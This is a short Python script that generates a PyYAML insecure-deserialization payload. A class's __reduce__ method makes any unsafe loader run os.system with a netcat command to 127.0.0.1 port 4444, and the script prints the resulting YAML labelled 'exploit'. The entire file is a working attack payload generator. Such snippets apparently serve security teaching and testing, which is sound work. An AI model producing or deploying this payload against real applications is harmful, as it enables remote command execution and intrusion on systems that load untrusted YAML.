import yaml
import os

class Ser(object):
    def __reduce__(self):
        return (os.system,("nc 127.0.0.1 4444",))

#Serializing
exploit = yaml.dump(Ser())
print(exploit)
